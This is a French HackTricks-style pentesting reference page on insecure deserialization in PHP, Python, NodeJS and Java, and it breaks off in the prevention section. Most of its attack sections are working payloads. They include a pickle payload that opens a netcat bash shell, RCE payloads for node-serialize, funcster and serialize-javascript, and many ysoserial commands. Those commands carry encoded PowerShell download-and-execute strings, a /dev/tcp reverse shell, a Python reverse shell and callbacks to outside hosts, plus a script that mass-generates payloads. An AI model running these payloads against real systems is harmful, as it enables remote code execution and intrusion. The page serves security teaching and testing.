# D√©s√©rialisation

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez**-nous sur **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
**La s√©rialisation** est le processus de transformation d'un objet en un format de donn√©es qui peut √™tre restaur√© ult√©rieurement. Les gens s√©rialisent souvent des objets afin de les sauvegarder dans un stockage, ou de les envoyer dans le cadre de communications.

**La d√©s√©rialisation** est l'inverse de ce processus, prenant des donn√©es structur√©es √† partir d'un format, et les reconstruisant en un objet. Aujourd'hui, le format de donn√©es le plus populaire pour la s√©rialisation est JSON. Avant cela, c'√©tait XML.

√Ä de nombreuses occasions, vous pouvez trouver du code c√¥t√© serveur qui d√©s√©rialise un objet fourni par l'utilisateur.\
Dans ce cas, vous pouvez envoyer une charge utile malveillante pour faire comporter le c√¥t√© serveur de mani√®re inattendue.

**Vous devriez lire :** [**https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html) **pour apprendre comment attaquer.**

## PHP

M√©thode magique utilis√©e avec la s√©rialisation :

* `__sleep` est appel√© lorsqu'un objet est s√©rialis√© et doit retourner un tableau

M√©thode magique utilis√©e avec la d√©s√©rialisation :

* `__wakeup` est appel√© lorsqu'un objet est d√©s√©rialis√©.
* `__unserialize` est appel√© √† la place de `__wakeup` s'il existe.
* `__destruct` est appel√© lorsque le script PHP se termine et que l'objet est d√©truit.
* `__toString` utilise l'objet comme une cha√Æne mais peut aussi √™tre utilis√© pour lire un fichier ou plus que cela en fonction de l'appel de fonction √† l'int√©rieur.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
Si vous regardez les r√©sultats, vous pouvez voir que les fonctions **`__wakeup`** et **`__destruct`** sont appel√©es lorsque l'objet est d√©s√©rialis√©. Notez que dans plusieurs tutoriels, vous trouverez que la fonction **`__toString`** est appel√©e lors de la tentative d'impression d'un attribut, mais apparemment cela **n'arrive plus**.

{% hint style="warning" %}
La m√©thode **`__unserialize(array $data)`** est appel√©e **√† la place de `__wakeup()`** si elle est impl√©ment√©e dans la classe. Elle vous permet de d√©s√©rialiser l'objet en fournissant les donn√©es s√©rialis√©es sous forme de tableau. Vous pouvez utiliser cette m√©thode pour d√©s√©rialiser les propri√©t√©s et effectuer les t√¢ches n√©cessaires lors de la d√©s√©rialisation.
```php
phpCopy codeclass MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

Vous pouvez lire un **exemple PHP expliqu√© ici** : [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), ici [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) ou ici [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Classes Autoload

Vous pourriez abuser de la fonctionnalit√© d'autoload PHP pour charger des fichiers php arbitraires et plus :

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### S√©rialisation de Valeurs R√©f√©renc√©es

Si pour une raison quelconque vous souhaitez s√©rialiser une valeur comme une **r√©f√©rence √† une autre valeur s√©rialis√©e**, vous pouvez :
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (ysoserial pour PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) peut vous aider √† g√©n√©rer des charges utiles pour exploiter les d√©s√©rialisations PHP.\
Notez que dans plusieurs cas, vous **ne pourrez pas trouver de moyen d'exploiter une d√©s√©rialisation dans le code source** de l'application, mais vous pourriez √™tre en mesure d'**exploiter le code des extensions PHP externes.**\
Donc, si vous le pouvez, v√©rifiez le `phpinfo()` du serveur et **recherchez sur internet** (et m√™me sur les **gadgets** de **PHPGGC**) un gadget possible que vous pourriez exploiter.

### phar:// d√©s√©rialisation des m√©tadonn√©es

Si vous avez trouv√© une LFI qui se contente de lire le fichier sans ex√©cuter le code PHP √† l'int√©rieur, par exemple en utilisant des fonctions comme _**file\_get\_contents(), fopen(), file() ou file\_exists(), md5\_file(), filemtime() ou filesize()**_. Vous pouvez essayer d'exploiter une **d√©s√©rialisation** se produisant lors de la **lecture** d'un **fichier** en utilisant le protocole **phar**.\
Pour plus d'informations, lisez le post suivant :

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

Lorsqu'un objet est d√©pickl√©, la fonction _\_\_reduce\_\__ sera ex√©cut√©e.\
Lorsqu'exploit√©, le serveur pourrait retourner une erreur.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Pour plus d'informations sur l'√©vasion des **pickle jails**, consultez :

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **&** jsonpickle

La page suivante pr√©sente la technique pour **abuser d'une d√©s√©rialisation non s√©curis√©e dans les biblioth√®ques yaml** de Python et se termine par un outil qui peut √™tre utilis√© pour g√©n√©rer un payload de d√©s√©rialisation RCE pour **Pickle, PyYAML, jsonpickle et ruamel.yaml** :

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### Pollution de Classe (Pollution de Prototype en Python)

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### Fonctions Magiques JS

JS **n'a pas de fonctions "magiques"** comme PHP ou Python qui sont ex√©cut√©es juste pour la cr√©ation d'un objet. Mais il a certaines **fonctions** qui sont **fr√©quemment utilis√©es m√™me sans les appeler directement** telles que **`toString`**, **`valueOf`**, **`toJSON`**.\
Si vous abusez d'une d√©s√©rialisation, vous pouvez **compromettre ces fonctions pour ex√©cuter d'autres codes** (potentiellement en abusant des pollutions de prototype), vous pourriez ex√©cuter du code arbitraire lorsqu'elles sont appel√©es.

Une autre **mani√®re "magique" d'appeler une fonction** sans l'appeler directement est en **compromettant un objet qui est retourn√© par une fonction asynchrone** (promesse). Car, si vous **transformez** cet **objet retourn√©** en une autre **promesse** avec une **propri√©t√©** appel√©e **"then" de type fonction**, elle sera **ex√©cut√©e** simplement parce qu'elle est retourn√©e par une autre promesse. _Suivez_ [_**ce lien**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _pour plus d'informations._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### Pollution de `__proto__` et `prototype`

Si vous souhaitez en savoir plus sur cette technique, **consultez le tutoriel suivant** :

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Cette biblioth√®que permet de s√©rialiser des fonctions. Exemple :
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
L'**objet s√©rialis√©** ressemblera √† :
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
Vous pouvez voir dans l'exemple que lorsqu'une fonction est s√©rialis√©e, le drapeau `_$$ND_FUNC$$_` est ajout√© √† l'objet s√©rialis√©.

Dans le fichier `node-serialize/lib/serialize.js`, vous pouvez trouver le m√™me drapeau et comment le code l'utilise.

![](<../../.gitbook/assets/image (297).png>)

![](<../../.gitbook/assets/image (298).png>)

Comme vous pouvez le voir dans le dernier extrait de code, **si le drapeau est trouv√©**, `eval` est utilis√© pour d√©s√©rialiser la fonction, donc en gros **l'entr√©e utilisateur est utilis√©e √† l'int√©rieur de la fonction `eval`**.

Cependant, **juste s√©rialiser** une fonction **ne l'ex√©cutera pas** car il serait n√©cessaire qu'une partie du code **appelle `y.rce`** dans notre exemple et c'est tr√®s **peu probable**.\
Quoi qu'il en soit, vous pourriez juste **modifier l'objet s√©rialis√©** **en ajoutant des parenth√®ses** afin d'ex√©cuter automatiquement la fonction s√©rialis√©e lorsque l'objet est d√©s√©rialis√©.\
Dans le prochain extrait de code, **remarquez la derni√®re parenth√®se** et comment la fonction `unserialize` ex√©cutera automatiquement le code :
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
Comme indiqu√© pr√©c√©demment, cette biblioth√®que ex√©cutera le code apr√®s `_$$ND_FUNC$$_` en utilisant `eval`. Par cons√©quent, pour **ex√©cuter automatiquement du code**, vous pouvez **supprimer la partie de cr√©ation de la fonction** et la derni√®re parenth√®se et **ex√©cuter simplement un JS oneliner** comme dans l'exemple suivant :
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
Vous pouvez [**trouver ici**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **plus d'informations** sur comment exploiter cette vuln√©rabilit√©.

### [funcster](https://www.npmjs.com/package/funcster)

La diff√©rence int√©ressante ici est que les **objets int√©gr√©s standards ne sont pas accessibles**, car ils sont hors de port√©e. Cela signifie que nous pouvons ex√©cuter notre code, mais ne pouvons pas appeler les m√©thodes des objets int√©gr√©s. Donc, si nous utilisons `console.log()` ou `require(quelquechose)`, Node renvoie une exception comme `"ReferenceError: console is not defined"`.

Cependant, nous pouvons facilement r√©cup√©rer l'acc√®s √† tout car nous avons toujours acc√®s au contexte global en utilisant quelque chose comme `this.constructor.constructor("console.log(1111)")();` :
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**Pour**[ **plus d'informations, lisez cette page**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

Le package **ne comprend aucune fonctionnalit√© de d√©s√©rialisation** et vous oblige √† l'impl√©menter vous-m√™me. Leur exemple utilise directement `eval`. Voici l'exemple officiel de d√©s√©rialisation :
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
Si cette fonction est utilis√©e pour d√©s√©rialiser des objets, vous pouvez l'**exploiter facilement** :
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
### Biblioth√®que Cryo

Dans les pages suivantes, vous pouvez trouver des informations sur comment exploiter cette biblioth√®que pour ex√©cuter des commandes arbitraires :

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

Le principal probl√®me avec les objets d√©s√©rialis√©s en Java est que **les rappels de d√©s√©rialisation √©taient invoqu√©s pendant la d√©s√©rialisation**. Cela permet √† un **attaquant** de **profiter de ces rappels** et de pr√©parer une charge utile qui exploite les rappels pour **effectuer des actions malveillantes**.

### Empreintes

#### Bo√Æte Blanche

Cherchez dans le code les classes et fonctions de s√©rialisation. Par exemple, recherchez des classes impl√©mentant `Serializable`, l'utilisation de `java.io.ObjectInputStream` \_\_ ou des fonctions `readObject` \_\_ ou `readUnshare`\_._

Vous devriez √©galement surveiller :

* `XMLdecoder` avec des param√®tres d√©finis par l'utilisateur externe
* `XStream` avec la m√©thode `fromXML` (version xstream <= v1.46 est vuln√©rable au probl√®me de s√©rialisation)
* `ObjectInputStream` avec `readObject`
* Utilisations de `readObject`, `readObjectNodData`, `readResolve` ou `readExternal`
* `ObjectInputStream.readUnshared`
* `Serializable`

#### Bo√Æte Noire

**Empreintes/Magic Bytes** d'objets **java s√©rialis√©s** (de `ObjectInputStream`):

* `AC ED 00 05` en Hex
* `rO0` en Base64
* En-t√™te `Content-type` d'une r√©ponse HTTP d√©fini √† `application/x-java-serialized-object`
* `1F 8B 08 00` Hex compress√© auparavant
* `H4sIA` Base64 compress√© auparavant
* Fichiers web avec l'extension `.faces` et le param√®tre `faces.ViewState`. Si vous trouvez cela dans une webapp, jetez un ≈ìil au [**post sur la d√©s√©rialisation de Java JSF ViewState**](java-jsf-viewstate-.faces-deserialization.md).
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### V√©rifier si vuln√©rable

Si vous souhaitez **comprendre comment fonctionne une exploitation de d√©s√©rialisation Java**, vous devriez consulter [**D√©s√©rialisation Java de base**](basic-java-deserialization-objectinputstream-readobject.md), [**D√©s√©rialisation DNS Java**](java-dns-deserialization-and-gadgetprobe.md), et [**Charge utile CommonsCollection1**](java-transformers-to-rutime-exec-payload.md).

#### Test en bo√Æte blanche

Vous pouvez v√©rifier s'il y a des applications install√©es avec des vuln√©rabilit√©s connues.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
Vous pourriez essayer de **v√©rifier toutes les biblioth√®ques** connues pour √™tre vuln√©rables et pour lesquelles [**Ysoserial**](https://github.com/frohoff/ysoserial) peut fournir un exploit. Ou vous pourriez v√©rifier les biblioth√®ques indiqu√©es sur [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json).\
Vous pourriez √©galement utiliser [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) pour rechercher des cha√Ænes de gadgets potentiellement exploitables.\
Lorsque vous ex√©cutez **gadgetinspector** (apr√®s l'avoir construit), ne vous pr√©occupez pas des nombreux avertissements/erreurs qu'il rencontre et laissez-le terminer. Il √©crira tous les r√©sultats sous _gadgetinspector/gadget-results/gadget-chains-year-month-day-hour-min.txt_. Veuillez noter que **gadgetinspector ne cr√©era pas d'exploit et peut indiquer des faux positifs**.

#### Test Bo√Æte Noire

En utilisant l'extension Burp [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md), vous pouvez identifier **quelles biblioth√®ques sont disponibles** (et m√™me leurs versions). Avec ces informations, il pourrait √™tre **plus facile de choisir un payload** pour exploiter la vuln√©rabilit√©.\
[**Lisez ceci pour en savoir plus sur GadgetProbe**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe se concentre sur les d√©s√©rialisations **`ObjectInputStream`**.

En utilisant l'extension Burp [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner), vous pouvez **identifier les biblioth√®ques vuln√©rables** exploitables avec ysoserial et les **exploiter**.\
[**Lisez ceci pour en savoir plus sur Java Deserialization Scanner.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner se concentre sur les d√©s√©rialisations **`ObjectInputStream`**.

Vous pouvez √©galement utiliser [**Freddy**](https://github.com/nccgroup/freddy) pour **d√©tecter les vuln√©rabilit√©s de d√©s√©rialisation** dans **Burp**. Ce plugin d√©tectera non seulement les vuln√©rabilit√©s li√©es √† **`ObjectInputStream`** mais aussi celles des biblioth√®ques de d√©s√©rialisation **Json** et **Yml**. En mode actif, il essaiera de les confirmer en utilisant des payloads de sommeil ou DNS.\
[**Vous pouvez trouver plus d'informations sur Freddy ici.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Test de S√©rialisation**

Il ne s'agit pas seulement de v√©rifier si une biblioth√®que vuln√©rable est utilis√©e par le serveur. Parfois, vous pourriez √™tre capable de **modifier les donn√©es √† l'int√©rieur de l'objet s√©rialis√© et de contourner certains contr√¥les** (peut-√™tre vous octroyer des privil√®ges d'administrateur dans une application web).\
Si vous trouvez un objet Java s√©rialis√© envoy√© √† une application web, **vous pouvez utiliser** [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **pour imprimer dans un format plus lisible par l'homme l'objet de s√©rialisation envoy√©**. Savoir quelles donn√©es vous envoyez serait plus facile pour les modifier et contourner certains contr√¥les.

### **Exploit**

#### **ysoserial**

L'outil le plus connu pour exploiter les d√©s√©rialisations Java est [**ysoserial**](https://github.com/frohoff/ysoserial) ([**t√©l√©chargez ici**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). Vous pouvez √©galement envisager d'utiliser [**ysoserial-modified**](https://github.com/pimps/ysoserial-modified) qui vous permettra d'utiliser des commandes complexes (avec des pipes par exemple).\
Notez que cet outil est **ax√©** sur l'exploitation des **`ObjectInputStream`**.\
Je commencerais par utiliser le payload "URLDNS" **avant un payload RCE** pour tester si l'injection est possible. Cependant, notez que peut-√™tre le payload "URLDNS" ne fonctionne pas mais qu'un autre payload RCE fonctionne.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
Lors de la cr√©ation d'un payload pour **java.lang.Runtime.exec()**, vous **ne pouvez pas utiliser de caract√®res sp√©ciaux** comme ">" ou "|" pour rediriger la sortie d'une ex√©cution, "$()" pour ex√©cuter des commandes ou m√™me **passer des arguments** √† une commande s√©par√©s par des **espaces** (vous pouvez faire `echo -n "hello world"` mais vous ne pouvez pas faire `python2 -c 'print "Hello world"'`). Afin de coder correctement le payload, vous pourriez [utiliser cette page web](http://www.jackson-t.ca/runtime-exec-payloads.html).

N'h√©sitez pas √† utiliser le script suivant pour cr√©er **tous les payloads d'ex√©cution de code possibles** pour Windows et Linux, puis √† les tester sur la page web vuln√©rable :
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

Vous pouvez **utiliser** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **en combinaison avec ysoserial pour cr√©er plus d'exploits**. Plus d'informations sur cet outil dans les **diapositives de la conf√©rence** o√π l'outil a √©t√© pr√©sent√© : [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1)

#### marshalsec

[**marshalsec**](https://github.com/mbechler/marshalsec) peut √™tre utilis√© pour g√©n√©rer des charges utiles pour exploiter diff√©rentes biblioth√®ques de s√©rialisation **Json** et **Yml** en Java.\
Pour compiler le projet, j'ai d√ª **ajouter** ces **d√©pendances** au fichier `pom.xml` :
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Installez maven**, et **compilez** le projet :
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

Lisez plus sur cette biblioth√®que JSON Java : [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Labs

* Si vous souhaitez tester des payloads ysoserial, vous pouvez **ex√©cuter cette application web** : [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Pourquoi

Java ADORE envoyer des objets s√©rialis√©s partout. Par exemple :

* Dans les **requ√™tes HTTP** ‚Äì Param√®tres, ViewState, Cookies, tout ce que vous voulez.
* **RMI** ‚Äì Le protocole RMI de Java, largement utilis√©, est bas√© √† 100% sur la s√©rialisation.
* **RMI sur HTTP** ‚Äì De nombreuses applications web √©paisses Java utilisent cela ‚Äì encore une fois, 100% d'objets s√©rialis√©s.
* **JMX** ‚Äì L√† encore, repose sur des objets s√©rialis√©s envoy√©s par le r√©seau.
* **Protocoles personnalis√©s** ‚Äì Envoyer et recevoir des objets Java bruts est la norme ‚Äì ce que nous verrons dans certains des exploits √† venir.

### Pr√©vention

#### Objets transitoires

Une classe qui impl√©mente `Serializable` peut d√©clarer comme `transient` tout objet √† l'int√©rieur de la classe qui ne devrait pas √™tre s√©rialisable. Par exemple :
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### √âviter la s√©rialisation d'une classe devant impl√©menter Serializable

